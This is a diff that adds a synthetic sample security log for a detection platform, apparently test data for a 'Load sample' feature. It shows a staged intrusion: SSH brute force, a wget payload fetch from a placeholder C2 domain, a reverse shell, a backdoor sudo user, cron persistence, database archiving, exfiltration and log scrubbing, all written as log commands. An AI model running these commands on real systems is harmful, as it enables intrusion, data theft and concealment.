@@ -1,0 +1,23 @@
+# Clarion Sample Security Log — Multi-Stage APT Attack
+# Use this to test the platform with "Load sample" in New Scan
+
+2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
+2024-01-15 02:14:51 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=1203
+2024-01-15 02:18:47 SSH FAIL   src=185.220.101.47  user=admin  dst=10.0.1.5  attempt=1
+2024-01-15 02:18:49 SSH FAIL   src=185.220.101.47  user=root   dst=10.0.1.5  attempt=2
+2024-01-15 02:18:51 SSH FAIL   src=185.220.101.47  user=ubuntu dst=10.0.1.5  attempt=3
+2024-01-15 02:19:22 SSH SUCCESS src=185.220.101.47  user=deploy dst=10.0.1.5  session=44291
+2024-01-15 02:19:28 PROCESS     pid=9934  user=deploy  cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
+2024-01-15 02:19:28 DNS QUERY   src=10.0.1.5  query=malware-c2.ru  type=A  response=91.108.4.14
+2024-01-15 02:19:30 PROCESS     pid=9935  user=deploy  cmd="chmod +x /tmp/.hidden_update && /tmp/.hidden_update &"
+2024-01-15 02:19:33 SYSLOG WARN msg="Privilege escalation via CVE-2023-0386 - process gained root"
+2024-01-15 02:19:35 NETWORK     dst=91.108.4.14  src=10.0.1.5  port=4444  state=ESTABLISHED  msg="Reverse shell established"
+2024-01-15 02:19:38 PROCESS     user=root  cmd="useradd -m -s /bin/bash -G sudo svc_backup"
+2024-01-15 02:19:45 PROCESS     user=root  cmd="echo '* * * * * root /tmp/.hidden_update' >> /etc/crontab"
+2024-01-15 02:20:03 SSH SUCCESS  src=10.0.1.5  user=ubuntu  dst=10.0.1.12  msg="Lateral movement to internal server"
+2024-01-15 02:20:15 SSH SUCCESS  src=10.0.1.5  user=ubuntu  dst=10.0.1.20  msg="Lateral movement to database server"
+2024-01-15 02:20:22 PROCESS      user=root  cmd="find / -name '*.sql' -o -name '*.db' 2>/dev/null"
+2024-01-15 02:20:45 PROCESS      user=root  cmd="tar -czf /tmp/.archive.tgz /var/lib/mysql /home"
+2024-01-15 02:21:19 NETWORK      dst=91.108.4.14  src=10.0.1.12  port=443  bytes=94732180  msg="90.3MB data exfiltrated via HTTPS"
+2024-01-15 02:21:45 PROCESS      user=root  cmd="rm -rf /tmp/.hidden_update /tmp/.archive.tgz"
+2024-01-15 02:21:50 PROCESS      user=root  cmd="sed -i '/svc_backup/d' /var/log/auth.log"
